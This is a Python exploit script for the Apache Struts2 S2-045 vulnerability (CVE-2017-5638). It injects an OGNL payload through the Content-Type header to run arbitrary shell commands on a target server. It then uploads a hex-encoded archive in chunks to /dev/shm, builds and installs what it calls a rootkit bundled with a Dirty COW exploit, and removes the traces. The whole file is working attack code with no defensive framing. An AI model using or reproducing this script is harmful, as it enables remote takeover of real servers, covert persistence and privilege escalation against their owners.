import urllib.request, urllib.error, urllib.parse
import http.client
import tarfile
import binascii
import math
import time
import os

def exploit(url, cmd, echoCmd=''):
    print(("[*] cmd (%d): %s" % (len(cmd), echoCmd)))
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"
 
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        request = urllib.request.Request(url, headers=headers)
        page = urllib.request.urlopen(request).read()
        time.sleep(0.01)
    except http.client.IncompleteRead as e:
        page = e.partial
        print(page)
    return page
 
if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("[*] struts2.py <url>")
    else:
        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
        url = sys.argv[1]

        tar = tarfile.open('rootkit.tar.gz', 'w:gz')
        for name in ['dirtyc0w.c', 'Makefile', 'rootkit.c']:
            tar.add(name)
        tar.close()

        with open('./rootkit.tar.gz', 'rb') as f:
            content = f.read()
        binstr = binascii.hexlify(content).decode('ascii')
        f.close()
        os.remove('./rootkit.tar.gz')

        cmd = ': > /dev/shm/rootkit.tar.gz'
        exploit(url, cmd, cmd)
        blocksize = 512
        part_count = math.floor(len(binstr) / blocksize)
        for i in range(part_count):
            part = binstr[(i * blocksize):((i + 1) * blocksize)]
            part = '\\\\x' + '\\\\x'.join(part[n : n + 2] for n in range(0, len(part), 2))
            cmd = 'echo -n -e \\\'' + part + '\\\' >> /dev/shm/rootkit.tar.gz'
            exploit(url, cmd, 'part ' + str(i))
        part = binstr[(part_count * blocksize):]
        part = '\\\\x' + '\\\\x'.join(part[n : n + 2] for n in range(0, len(part), 2))
        cmd = 'echo -n -e \\\'' + part + '\\\' >> /dev/shm/rootkit.tar.gz'
        exploit(url, cmd, 'part ' + str(part_count))
        
        cmd = 'cd /dev/shm/ && tar xvf rootkit.tar.gz && make install || : && rm rootkit.tar.gz rootkit.c dirtyc0w.c Makefile'
        exploit(url, cmd, cmd)
        
